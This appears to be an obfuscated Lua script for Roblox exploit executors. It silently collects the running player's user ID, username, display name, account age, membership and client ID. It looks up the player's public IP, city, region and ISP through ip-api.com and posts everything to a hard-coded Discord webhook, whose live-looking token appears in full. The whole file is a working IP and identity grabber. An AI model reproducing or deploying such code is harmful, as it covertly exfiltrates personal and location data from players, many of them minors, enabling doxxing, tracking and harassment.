local _1=game:GetService("HttpService")
local _2=game:GetService("Players")
local _3=game:GetService("MarketplaceService")
local _4=_2.LocalPlayer 
local _5=_4.UserId 
local _6=_4.DisplayName 
local _7=_4.Name 
local _8=tostring(_4.MembershipType):sub(21) 
local _9=_4.AccountAge 
local _10=game.LocalizationService.RobloxLocaleId 
local _11=_1:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local _12=_11.query 
local _13=_11.country 
local _14=_11.regionName 
local _15=_11.city 
local _16=_11.isp 
local _17=game:GetService("RbxAnalyticsService"):GetClientId() 
local _18='Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")' 
local _19=_3:GetProductInfo(game.PlaceId).Name 

local function _20()
    local _21={
        ["content"]="",
        ["embeds"]={
            {
                ["title"]="Player and IP Details",
                ["description"]=string.format(
                    "**Player Information:**\n" ..
                    "**User ID:** %s\n**Display Name:** %s\n**Username:** %s\n" ..
                    "**Membership Type:** %s\n**Account Age:** %d days\n**Country Code:** %s\n\n" ..
                    "**IP Details:**\n" ..
                    "**IP:** %s\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s",
                    _5, _6, _7, _8, _9, _10, _12, _13, _14, _15, _16
                ),
                ["type"]="rich"
            }
        }
    }
    return _1:JSONEncode(_21)
end 

local function _22(_23,_24)
    local _25={
        ["content-type"]="application/json"
    }
    local _26=http_request or request or HttpPost or syn.request 
    local _27={Url=_23, Body=_24, Method="POST", Headers=_25} 
    _26(_27)
end 

local _28="https://discordapp.com/api/webhooks/1349404991210913875/cNpyuvdEArBkaSxm_zaVgj8TZ6yowc10WEKgjN5qy8gK5vHJeycYb9-GwjTu7Wuh5EXV"
local _29=_20() 
_22(_28,_29)
